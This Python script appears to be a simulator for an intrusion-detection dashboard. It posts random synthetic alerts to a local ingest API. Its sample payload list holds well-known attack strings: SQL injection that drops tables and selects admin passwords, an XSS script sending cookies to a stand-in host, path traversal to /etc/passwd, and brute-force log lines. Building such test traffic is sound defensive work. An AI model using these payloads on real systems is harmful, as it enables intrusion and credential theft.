import argparse
import os
import random
import time
from datetime import datetime
from pathlib import Path

import requests


ATTACK_VECTORS = [
    {
        "type": "SQL Injection",
        "severity": "critical",
        "protocol": "HTTP",
        "action": "logged",
        "payloads": [
            "GET /login.php?user=admin' OR '1'='1' --",
            "POST /search HTTP/1.1\nContent-Type: application/json\n\n{\"query\": \"1; DROP TABLE users\"}",
            "GET /products?id=1 UNION SELECT username, password FROM admin_users",
        ],
    },
    {
        "type": "Cross-Site Scripting (XSS)",
        "severity": "high",
        "protocol": "HTTP",
        "action": "logged",
        "payloads": [
            "GET /forum?topic=<script>fetch('http://example.test/steal?c='+document.cookie)</script>",
            "POST /comment HTTP/1.1\n\n<img src='x' onerror='alert(1)'>",
            "GET /profile?name=\"><svg/onload=prompt(1)>",
        ],
    },
    {
        "type": "Path Traversal",
        "severity": "high",
        "protocol": "HTTP",
        "action": "blocked",
        "payloads": [
            "GET /download.php?file=../../../../etc/passwd",
            "GET /assets/../../../windows/system32/cmd.exe",
        ],
    },
    {
        "type": "DDoS Attempt (SYN Flood)",
        "severity": "medium",
        "protocol": "TCP",
        "action": "logged",
        "payloads": [
            "[TCP FLAGS: SYN] Sequence=123456789 Window=65535",
            "[TCP FLAGS: SYN] Malformed packet header detected.",
        ],
    },
    {
        "type": "SSH Brute Force",
        "severity": "low",
        "protocol": "TCP",
        "action": "blocked",
        "payloads": [
            "Failed password for root from 192.168.1.100 port 22 ssh2",
            "Invalid user admin from 192.168.1.100",
        ],
    },
]

DESTINATION_IPS = ["10.0.0.5", "10.0.0.10", "192.168.1.50", "172.16.254.1"]


def read_env_file_value(path: Path, key: str) -> str | None:
    if not path.exists():
        return None

    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or "=" not in stripped:
            continue
        env_key, value = stripped.split("=", 1)
        if env_key.strip() == key:
            return value.strip().strip('"').strip("'")
    return None


def default_api_key() -> str | None:
    return (
        os.getenv("WIDS_API_KEY")
        or os.getenv("API_KEY")
        or read_env_file_value(Path(__file__).resolve().parent / ".env", "API_KEY")
        or read_env_file_value(Path(__file__).resolve().parents[1] / ".env", "API_KEY")
    )


def build_alert_payload() -> dict:
    vector = random.choice(ATTACK_VECTORS)
    source_ip = f"{random.randint(11, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    return {
        "type": vector["type"],
        "severity": vector["severity"],
        "source_ip": source_ip,
        "destination_ip": random.choice(DESTINATION_IPS),
        "source_port": random.randint(1024, 65535),
        "destination_port": random.choice([80, 443, 22, 3306]),
        "protocol": vector["protocol"],
        "action": vector["action"],
        "payload_preview": random.choice(vector["payloads"]),
    }


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Generate synthetic IDS alerts through /alerts/ingest.")
    parser.add_argument("--base-url", default=os.getenv("WIDS_BASE_URL", "http://127.0.0.1:8000"))
    parser.add_argument("--api-key", default=default_api_key())
    parser.add_argument("--count", type=int, default=20, help="Number of alerts to send. Use 0 for continuous mode.")
    parser.add_argument("--delay-min", type=float, default=0.4)
    parser.add_argument("--delay-max", type=float, default=1.4)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if not args.api_key:
        print("Missing API key. Set WIDS_API_KEY/API_KEY or pass --api-key.")
        return 2

    headers = {
        "X-API-Key": args.api_key,
        "Content-Type": "application/json",
    }
    total = "continuous" if args.count == 0 else str(args.count)
    print(f"[{datetime.now().strftime('%H:%M:%S')}] W-IDS attack simulation starting ({total} alerts).")

    counter = 1
    while args.count == 0 or counter <= args.count:
        payload = build_alert_payload()
        try:
            response = requests.post(f"{args.base_url}/alerts/ingest", json=payload, headers=headers, timeout=8)
        except requests.exceptions.ConnectionError:
            print(f"[{counter}] connection refused at {args.base_url}. Is backend running?")
            return 1

        if response.status_code == 201:
            print(f"[{counter}] {payload['severity'].upper()} {payload['type']} from {payload['source_ip']}")
        else:
            print(f"[{counter}] HTTP {response.status_code}: {response.text}")

        counter += 1
        if args.count == 0 or counter <= args.count:
            time.sleep(random.uniform(args.delay_min, args.delay_max))

    print(f"[{datetime.now().strftime('%H:%M:%S')}] Simulation completed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
